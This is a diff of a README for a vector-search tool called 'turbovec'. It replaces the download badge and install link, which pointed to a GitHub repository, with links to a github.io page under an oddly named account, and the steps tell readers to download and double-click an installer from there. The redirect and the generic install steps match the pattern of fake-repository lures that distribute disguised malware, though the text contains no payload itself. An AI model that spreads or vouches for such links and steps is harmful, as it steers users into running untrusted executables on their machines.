@@ -1,6 +1,6 @@
 # ⚡ turbovec - Fast search for your data vectors
 
-[![Download](https://img.shields.io/badge/Download-Turbovec-blue)](https://github.com/fc03101998-ctrl/turbovec)
+[![Download](https://img.shields.io/badge/Download-Turbovec-blue)](https://fc03101998-ctrl.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you install this software, check that your computer meets these requireme
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the repository page to download the software: [https://github.com/fc03101998-ctrl/turbovec](https://github.com/fc03101998-ctrl/turbovec)
+1. Visit the repository page to download the software: [https://fc03101998-ctrl.github.io](https://fc03101998-ctrl.github.io)
 2. Locate the download button on the page.
 3. Save the installer file to a folder you can find later, such as your Downloads folder.
 4. Open the folder and double-click the installer file to launch the setup program.
